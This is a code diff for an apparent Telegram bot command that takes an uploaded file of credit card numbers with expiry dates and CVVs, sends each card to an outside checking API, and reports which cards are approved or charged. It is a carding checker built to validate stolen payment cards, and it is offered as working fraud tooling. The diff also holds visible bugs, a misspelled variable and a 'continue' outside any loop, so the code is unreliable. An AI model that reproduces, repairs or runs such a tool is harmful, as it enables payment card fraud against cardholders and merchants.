@@ -10,7 +10,7 @@ async def process_credit_card(cc_entry, message):
         x = re.findall(r'\d+', cc_entry)
         if len(x) != 4:
             print(f'Invalid CC format in file: {cc_entry}')
-            return
+            continue
         
         ccn = x[0]
         mm = x[1]
@@ -20,7 +20,7 @@ async def process_credit_card(cc_entry, message):
         VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
         if not ccn.startswith(VALID):
             print(f'Invalid CC type in file: {cc_entry}')
-            return
+            continue
 
         async with aiohttp.ClientSession() as session:
             url = "https://mvy.ai/sk_api/api.php"
@@ -34,40 +34,27 @@ async def process_credit_card(cc_entry, message):
 
                 if r['status'] == 'die':
                     fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
-                    await write_to_declined_file(fullcc, r['message'])
+                    die = f"{fullcc}\n𝖣𝖤𝖢𝖫𝖨𝖭𝖤𝖣 ❌ - {r['message']}\n\n"
+                    return die
 
                 elif r['status'] == 'approved':
                     fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
-                    amount_charged = r['payment_info']['amount']
-                    await write_to_approved_file(fullcc, r['message'], amount_charged)
-
+                    approved = f"{fullccc}\n𝖲𝖳𝖱𝖨𝖯𝖤 𝖠𝖴𝖳𝖧 $2 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"
+                    return approved
                 else:
-                    print(f"Unknown status received for {cc_entry}: {r['status']}")
+                    mm = "Unknown status received.\n\n"
+                    return mm
 
     except Exception as e:
         print(f"Error processing CC entry: {e}")
 
-async def write_to_approved_file(fullcc, message, amount):
-    try:
-        approved_filename = f'{message.from_user.id}approved.txt'
-        with open(approved_filename, 'a') as file:
-            file.write(f"{fullcc} - Approved: {message} - Amount Charged: ${amount}\n")
-    except Exception as e:
-        print(f"Error writing to approved file: {e}")
 
-async def write_to_declined_file(fullcc, message):
-    try:
-        declined_filename = f'{message.from_user.id}declined.txt'
-        with open(declined_filename, 'a') as file:
-            file.write(f"{fullcc} - Declined: {message}\n")
-    except Exception as e:
-        print(f"Error writing to declined file: {e}")
-
-@app.on_message(filters.command("mchk", prefixes=[".", "/"]))
+@app.on_message(filters.command("chkfile", prefixes=[".", "/"]))
 async def check_cc_file(_, message):
     try:
         reply_msg = message.reply_to_message
         if reply_msg and reply_msg.document:
+            vj = ""
             file_id = reply_msg.document.file_id
             file_path = await app.download_media(file_id)
 
@@ -78,15 +65,14 @@ async def check_cc_file(_, message):
                     task = asyncio.create_task(process_credit_card(cc_entry, message))
                     tasks.append(task)
 
-                await asyncio.gather(*tasks)
-            
-            await message.reply_document(f"{message.from_user.id}approved.txt")
-            await message.reply_document(f"{message.from_user.id}declined.txt")
-
+                results = await asyncio.gather(*tasks)
+                for result in results:
+                    vj += result
+                with open(f'{message.from_user.id}.txt', 'a') as f:
+                    f.write(f"{vj}")
+                await message.reply_document(f"{message.from_user.id}.txt")
             os.remove(file_path)
-            os.remove(f"{message.from_user.id}approved.txt")
-            os.remove(f"{message.from_user.id}declined.txt")
-
+            os.remove(f"{message.from_user.id}.txt")
         else:
             await message.reply_text("Please reply to a text file containing credit card details.")
 
